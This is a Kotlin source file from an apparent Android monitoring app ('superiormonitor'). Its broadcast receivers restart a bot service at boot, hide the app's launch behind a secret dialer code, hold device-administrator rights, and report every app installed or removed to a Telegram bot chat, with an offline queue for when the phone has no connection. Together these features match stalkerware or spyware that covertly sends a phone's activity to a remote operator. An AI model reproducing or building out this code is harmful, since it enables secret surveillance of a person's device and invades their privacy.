package com.system.superiormonitor.core

import android.app.admin.DeviceAdminReceiver
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.telephony.TelephonyManager
import androidx.core.content.ContextCompat
import com.system.superiormonitor.MainActivity
import com.system.superiormonitor.bot.BotService
import com.system.superiormonitor.data.PrefsManager
import com.system.superiormonitor.core.LogCategory
import com.system.superiormonitor.core.LogLevel
import com.system.superiormonitor.core.LogManager
import android.content.pm.PackageManager
import com.system.superiormonitor.bot.OfflineManager
import com.system.superiormonitor.bot.TelegramApi
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
class BootReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action == Intent.ACTION_BOOT_COMPLETED) {
            val prefs = PrefsManager.getInstance(context)
            LogManager.log(LogCategory.SYSTEM, "Boot completed event received.")
            if (prefs.isServiceEnabled) {
                LogManager.log(LogCategory.SYSTEM, "Starting background service from boot...")
                val serviceIntent = Intent(context, BotService::class.java).apply {
                    putExtra("from_boot", true)
                }
                try {
                    ContextCompat.startForegroundService(context, serviceIntent)
                } catch (e: Exception) {
                    LogManager.log(LogCategory.SYSTEM, "Failed to start service from boot: ${e.message}", LogLevel.ERROR)
                }
            } else {
                LogManager.log(LogCategory.SYSTEM, "Background service not enabled in prefs. Skipping boot start.")
            }
        }
    }
}

class DialerCodeReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent?) {
        if (intent?.action != TelephonyManager.ACTION_SECRET_CODE) {
            return
        }

        val code = intent.data?.schemeSpecificPart ?: "Unknown"
        LogManager.log(LogCategory.SYSTEM, "Secret dialer code triggered (*#*#$code#*#*). Launching MainActivity.")

        val i = Intent(context, MainActivity::class.java).apply {
            action = Intent.ACTION_MAIN
            flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TASK
        }
        
        try {
            context.startActivity(i)
        } catch (e: Exception) {
            LogManager.log(LogCategory.SYSTEM, "Failed to launch MainActivity from dialer: ${e.message}", LogLevel.ERROR)
        }
    }
}

class MonitorDeviceAdminReceiver : DeviceAdminReceiver() {
    override fun onEnabled(context: Context, intent: Intent) {
        super.onEnabled(context, intent)
        LogManager.log(LogCategory.ENFORCEMENT, "Device Administrator enabled")
    }

    override fun onDisabled(context: Context, intent: Intent) {
        super.onDisabled(context, intent)
        LogManager.log(LogCategory.ENFORCEMENT, "Device Administrator disabled")
    }
}

class AppInstallReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent) {
        val prefs = PrefsManager.getInstance(context)
        // Run directly when main bot service is enabled
        if (!prefs.isServiceEnabled) return
        
        // Filter out updates
        val isReplacing = intent.getBooleanExtra(Intent.EXTRA_REPLACING, false)
        if (isReplacing) return

        val packageName = intent.data?.schemeSpecificPart ?: return
        
        var appName = packageName
        val pm = context.packageManager
        try {
            val appInfo = pm.getApplicationInfo(packageName, 0)
            appName = pm.getApplicationLabel(appInfo).toString()
        } catch (e: PackageManager.NameNotFoundException) {
            // Use package name if app name not found (common for uninstalls)
        }
        
        val message = when (intent.action) {
            Intent.ACTION_PACKAGE_ADDED -> "📦 *App Installed:* \n\n *App Name*: `$appName`\n *Package Name*: `$packageName`"
            Intent.ACTION_PACKAGE_REMOVED -> "🗑️ *App Uninstalled:* \n\n *App Name*: `$appName`\n *Package Name*: `$packageName`"
            else -> return
        }
        
        CoroutineScope(Dispatchers.IO).launch {
            try {
                val actionName = if (intent.action == Intent.ACTION_PACKAGE_ADDED) "Installed" else "Uninstalled"
                LogManager.log(LogCategory.BOT_ACTIVITY, "[ACTIONS]App $actionName: $appName ($packageName)")
                
                OfflineManager.sendOrQueue(
                    context = context,
                    message = message,
                    offlineSubdir = "app_installs",
                    offlineFileName = "offline_installs.txt"
                ) { msg, format ->
                    TelegramApi.sendMessage(prefs.botToken, prefs.chatId, msg, format) != null
                }
            } catch (e: Exception) {
                LogManager.log(LogCategory.BOT_ACTIVITY, "[ACTIONS]AppInstallReceiver error: ${e.message}", com.system.superiormonitor.core.LogLevel.ERROR)
            }
        }
    }
}
